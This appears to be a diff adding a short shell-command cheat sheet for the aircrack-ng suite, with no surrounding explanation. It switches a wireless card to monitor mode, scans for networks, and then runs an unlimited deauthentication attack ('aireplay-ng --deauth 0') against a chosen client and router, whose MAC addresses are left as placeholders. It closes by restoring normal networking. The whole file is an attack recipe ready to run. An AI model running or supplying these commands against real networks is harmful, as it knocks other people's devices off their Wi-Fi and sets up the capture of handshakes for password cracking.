@@ -1,0 +1,14 @@
+sudo service NetworkManager stop
+sudo iwconfig wlan0 mode monitor channel #CHANNEL_NUMBER#
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+sudo airodump-ng wlan0mon --bssid #ROUTER_MAC_ADDRESS# --channel #CHANNEL_NUMBER#
+sudo aireplay-ng --deauth 0 -c #TARGET_DEVICE_MAC_ADDRESS# -a #ROUTER_MAC_ADDRESS# wlan0mon
+
+sudo airmon-ng stop wlan0mon
+
+
+sudo ifconfig wlan0mon down
+sudo iwconfig wlan0mon mode Monitor // Managed
+sudo ifconfig wlan0mon up
+sudo service NetworkManager restart
